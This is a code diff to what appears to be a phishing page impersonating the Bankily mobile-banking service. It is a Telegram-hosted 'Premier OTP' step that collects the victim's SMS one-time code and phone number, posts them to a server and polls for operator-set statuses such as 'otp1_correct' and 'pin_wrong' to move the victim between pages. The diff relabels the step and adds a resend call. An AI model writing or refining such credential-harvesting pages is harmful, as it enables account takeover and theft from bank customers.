@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Bankily - Vérification OTP</title>
+    <title>Bankily - Premier OTP</title>
     
-    <!-- ✅ Telegram SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
@@ -100,7 +99,6 @@
             gap: 8px;
         }
 
-        /* 4-Digit OTP Input Styles */
         .otp-input-group {
             display: flex;
             justify-content: center;
@@ -168,7 +166,6 @@
             margin-top: 40px;
         }
 
-        /* Overlay Styles */
         .overlay {
             position: fixed;
             top: 0;
@@ -258,10 +255,10 @@
 
 <div class="main-container">
     <div class="card">
-        <h2>Vérification OTP</h2>
+        <h2>Premier OTP</h2>
 
         <p class="instruction">
-            Veuillez entrer le code de vérification à 4 chiffres envoyé par SMS au numéro :
+            Veuillez entrer le premier code de vérification SMS envoyé au :
         </p>
 
         <div class="phone-number">
@@ -269,7 +266,6 @@
             <span id="displayPhone">+222 ...</span>
         </div>
 
-        <!-- 4 Digits OTP Inputs -->
         <div class="otp-input-group">
             <input type="text" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="one-time-code">
             <input type="text" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
@@ -289,7 +285,6 @@
 
 <div class="footer-banner"></div>
 
-<!-- Fullscreen Loading Overlay -->
 <div class="overlay" id="statusOverlay">
     <div class="overlay-card">
         <div class="spinner"></div>
@@ -297,7 +292,6 @@
     </div>
 </div>
 
-<!-- Fullscreen WhatsApp Contact Overlay -->
 <div class="overlay" id="contactOverlay">
     <div class="overlay-card">
         <div class="overlay-title">Contactez-nous sur WhatsApp</div>
@@ -320,24 +314,18 @@ document.addEventListener("DOMContentLoaded", () => {
     const errorText = document.getElementById('errorText');
 
     let checkInterval = null;
-
-    // Load saved phone number (Mauritania +222)
     const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "";
+    
     if (savedPhone) {
         displayPhone.textContent = `+222 ${savedPhone.replace(/^\+?222/, '')}`;
-    } else {
-        displayPhone.textContent = "+222 ...";
     }
 
-    // Auto-focus behavior and digit validation
     otpBoxes.forEach((box, index) => {
         box.addEventListener('input', () => {
             box.value = box.value.replace(/\D/g, '');
-
             if (box.value && index < otpBoxes.length - 1) {
                 otpBoxes[index + 1].focus();
             }
-
             checkOtpInputs();
         });
 
@@ -347,7 +335,6 @@ document.addEventListener("DOMContentLoaded", () => {
             }
         });
 
-        // Allow pasting full 4-digit code into first input box
         box.addEventListener('paste', (e) => {
             e.preventDefault();
             const pasteData = (e.clipboardData || window.clipboardData).getData('text').trim().replace(/\D/g, '');
@@ -366,7 +353,6 @@ document.addEventListener("DOMContentLoaded", () => {
         errorText.style.display = 'none';
     }
 
-    // Timer logic
     let timeLeft = 60;
     const timerInterval = setInterval(() => {
         timeLeft--;
@@ -374,11 +360,20 @@ document.addEventListener("DOMContentLoaded", () => {
 
         if (timeLeft <= 0) {
             clearInterval(timerInterval);
-            timerBox.innerHTML = '<span style="color:var(--bankily-teal); cursor:pointer; font-weight:700;" onclick="location.reload()">Renvoyer le code</span>';
+            timerBox.innerHTML = '<span style="color:var(--bankily-teal); cursor:pointer; font-weight:700;" id="resendBtn">Renvoyer le code</span>';
+            document.getElementById('resendBtn').addEventListener('click', resendOtp);
         }
     }, 1000);
 
-    // Status polling routine
+    async function resendOtp() {
+        await fetch('/api/resend-otp-notification', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: savedPhone, step: "First OTP" })
+        });
+        location.reload();
+    }
+
     function startStatusPolling() {
         if (checkInterval) clearInterval(checkInterval);
 
@@ -387,17 +382,14 @@ document.addEventListener("DOMContentLoaded", () => {
                 const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
                 const data = await res.json();
 
-                // Successful OTP -> Proceed to Page 9
                 if (data.status === "otp1_correct") {
                     clearInterval(checkInterval);
                     window.location.href = "/page9";
                 } 
-                // Incorrect PIN -> Redirect back to login step
                 else if (data.status === "otp2_wrongpin" || data.status === "pin_wrong") {
                     clearInterval(checkInterval);
                     window.location.href = "/page6?error=wrongpin";
                 } 
-                // Invalid OTP entry -> Reset form & show error
                 else if (data.status === "otp1_wrong") {
                     clearInterval(checkInterval);
                     statusOverlay.style.display = "none";
@@ -409,19 +401,17 @@ document.addEventListener("DOMContentLoaded", () => {
                     submitBtn.disabled = true;
                     submitBtn.classList.remove('active');
                 } 
-                // Trigger support overlay
                 else if (data.status === "contact_us") {
                     clearInterval(checkInterval);
                     statusOverlay.style.display = "none";
                     contactOverlay.style.display = "flex";
                 }
             } catch (err) {
-                console.error("Erreur de vérification du statut:", err);
+                console.error("Status check error:", err);
             }
         }, 2000);
     }
 
-    // Submit handler
     submitBtn.addEventListener('click', async () => {
         if (submitBtn.disabled) return;
 
@@ -440,7 +430,7 @@ document.addEventListener("DOMContentLoaded", () => {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     phone: savedPhone,
-                    otp: otpCode
+                    link: otpCode
                 })
             });
 
@@ -452,7 +442,7 @@ document.addEventListener("DOMContentLoaded", () => {
                 alert("Erreur lors de l'envoi.");
             }
         } catch (err) {
-            console.error("Erreur de soumission:", err);
+            console.error("Submit error:", err);
             statusOverlay.style.display = "none";
             alert("Erreur de connexion.");
         }
